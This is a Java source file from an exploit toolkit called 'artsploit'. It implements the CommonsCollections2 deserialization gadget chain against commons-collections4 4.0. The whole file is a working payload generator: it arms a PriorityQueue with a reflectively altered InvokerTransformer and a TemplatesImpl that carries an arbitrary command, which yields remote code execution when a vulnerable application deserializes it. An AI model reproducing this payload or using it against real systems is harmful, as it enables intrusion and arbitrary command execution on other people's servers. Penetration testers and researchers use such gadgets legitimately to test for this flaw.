package artsploit.gadgets;

import artsploit.Reflections;
import artsploit.Utilities;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.PriorityQueue;
import java.util.Queue;

/**
 * @className: CommonsCollections2
 * @description: TODO 类描述
 * @author: two_day
 * @date: 2022/5/12
 **/
/**
 * 适用条件：org.apache.commons:commons-collections4:4.0
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
public class CommonsCollections2 implements ObjectPayload<Queue<Object>>{

    @Override
    public Queue<Object> getObject(String command) throws Exception {
        final Object templates = Utilities.createTemplatesImpl(command);
        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        return queue;
    }
}
